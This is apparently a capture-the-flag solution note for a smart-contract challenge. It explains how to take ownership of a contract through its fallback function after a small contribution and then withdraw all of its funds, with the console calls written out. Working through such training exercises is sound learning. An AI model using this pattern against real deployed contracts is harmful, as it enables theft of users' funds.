/**
 *
# Objective

1. Become owner
2. Drain contract

# Solution

1. Note that whoever can pay the contract becomes the onwer
2. Note that it requires you to pay something and to have made a contribution
3. Note that contribute() is public and you need to send less than 0.001 ether.
4. Note that we can also become the owner if we make looooots of small transaction so that we surpass the owner... this is more expensive though and annoying so let's just do it the easy way:

```
contract.contribute({"value": toWei("0.0001")});
contract.send(toWei("0.0001"));

// sanity check, check owner is now player, first objective achieved
console.assert(await contract.owner() == player);

// withdraw everything
contract.withdraw();
```

# Learned

* Libraries like to receive their numbers as strings to avoid problems with floating point numbers.
* You really have to spam that `await` using the console.

*/
